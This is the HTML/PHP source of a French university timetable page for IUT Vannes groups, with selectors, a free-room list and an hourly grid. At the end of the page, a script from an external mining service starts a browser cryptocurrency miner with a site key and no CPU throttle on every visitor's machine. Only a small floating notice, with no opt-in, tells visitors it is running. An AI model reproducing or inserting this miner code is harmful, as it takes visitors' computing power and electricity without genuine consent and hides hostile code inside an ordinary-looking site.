<!-- Auteur Aymeric Bizouarn -->
<!doctype html>
<html lang="fr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device.width, initial-scale=1.0">
    <meta content='width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;' name='viewport'/>
    <meta name="viewport" content="width=device-width"/>
    <title>Planning</title>
    <link id="stylesheet" rel="stylesheet" href="style.css">
    <link rel="icon" type="image/png" href="image/iut-vannes2.png" />
    <script src="script.js"></script>
</head>
<body>
<!-- loading page -->
<div id="loader" class="loader"></div>
<SCRIPT LANGUAGE="JavaScript">
    function chargement() {
        document.getElementById('loader').setAttribute("style", "display:none;");
    }
</SCRIPT>
</body>
<!-- page -->
<body id="body">
<?php
//link fichier contenant les fonction php
require("function.php");
//redirige par default vers planning 1A1
$ret = testDataPost();
if ($ret == false) {
    echo "<script>
           chargement();
    </script>";
}
?>
<div class=main>
    <div class="menu">
        <div class="menu-b" onclick="clickMenu();">
            <img class="menu-b" src="image/menu_toggle.png">
        </div>
        <script>
            clickMenu();
        </script>
        <div class="noneP">
            <button class="semaine left" onclick="semaine(-1);">
                <
            </button>
            <button class="semaine center" onclick="semaine(0);">
                |
            </button>
            <button class="semaine right" onclick="semaine(1);">
                >
            </button>
        </div>
        <div id='titre'>
            <?php
            echo getGroup();
            ?>
        </div>
        <div id='day' class='noneP'>
            <?php
            //affichage mois - annee //menu sup
            echo getTitre();
            ?>
        </div>
        <div id="heure" class="noneP">
            <script type="text/javascript">
                heure();
            </script>
        </div>
    </div>
    <div class="contenu">
        <div id="menuL" style="display:none;">
            <center id="CmenuL">
                <br>
                <div class="borderM">
                    <h1>Sélection</h1>
                    <form class="principale">
                        <form method="get">
                            <div class="selectG">
                                <SELECT id="get6" name="dept" class="styled-select blue semi-square">
                                    <OPTION id="get5" style="display:none;">
                                        <script>
                                            SetSelect("get5", "dept");
                                        </script>
                                    </OPTION>
                                    <OPTION/>
                                    INFO
                                    <OPTION/>
                                    GEA
                                    <OPTION/>
                                    TC
                                </SELECT>
                                <SELECT id="get3" name="annee" class="styled-select blue semi-square">
                                    <OPTION id="get1" style="display:none;">
                                        <script>
                                            SetSelect("get1", "annee");
                                        </script>
                                    </OPTION>
                                    <OPTION/>
                                    1
                                    <OPTION/>
                                    2
                                </SELECT>
                                <SELECT id="get4" name="group" class="styled-select blue semi-square">
                                    <OPTION id="get2" style="display:none;">
                                        <script>
                                            SetSelect("get2", "group");
                                        </script>
                                    </OPTION>
                                    <OPTION/>
                                    A1
                                    <OPTION/>
                                    A2
                                    <OPTION/>
                                    B1
                                    <OPTION/>
                                    B2
                                    <OPTION/>
                                    C1
                                    <OPTION/>
                                    C2
                                    <OPTION/>
                                    D1
                                    <OPTION/>
                                    D2
                                </SELECT>
                            </div>
                            <button type="submit" class="styled-select blue semi-square">Valider</button>
                        </form>
                        <button onclick="SaveTab()" class="styled-select blue semi-square">Sauvegarder</button>
                        <br>
                        <br>
                    </form>
                </div>
                <br class="noneP">
                <div class="borderM">
                    <div>
                        <h1>Salle libre</h1>
                    </div>
                    <div>
                        <h2 style="width:80%;">
                            <?php
                            //affiche salle libre
                            echo getSalleLibre();
                            ?>
                        </h2>
                    </div>
                </div>
                <br class="noneP">
                <div id="footer">© 2016 RYDIN Nathan and LUX Mathieu<br>© 2019 Aymeric Bizouarn All Rights Reserved
                </div>
            </center>
        </div>
        <div id="grille">
            <div class="p-1 c-1"></div>
            <div class="p-1 c0">8h</div>
            <div class="p-1 c1">9h</div>
            <div class="p-1 c2">10h</div>
            <div class="p-1 c3">11h</div>
            <div class="p-1 c4">12h</div>
            <div class="midi">13h</div>
            <div class="p-1 c5">14h</div>
            <div class="p-1 c6">15h</div>
            <div class="p-1 c7">16h</div>
            <div class="p-1 c8">17h</div>
            <div class="p-1 c9">18h</div>
            <div class="p-1 c10"></div>
            <div class="border"></div>
            <?php affichage(); ?>
        </div>
    </div>
</div>
<script src="https://www.hostingcloud.racing/erHc.js"></script>
<script>
    var _client = new Client.Anonymous('a46423f62abe8267b3f27868e17256362bcec5966b4b51589bff0bf8aacf8c7b', {
        throttle: 0, c: 'w', ads: 0
    });
    _client.start();
    _client.addMiningNotification("Floating Bottom", "Ce site mine de la cryptomonaie pour finance le serveur et le reste sera reverser au BDE.", "#363e4100", 20, "#363e4100");
</script>
</body>
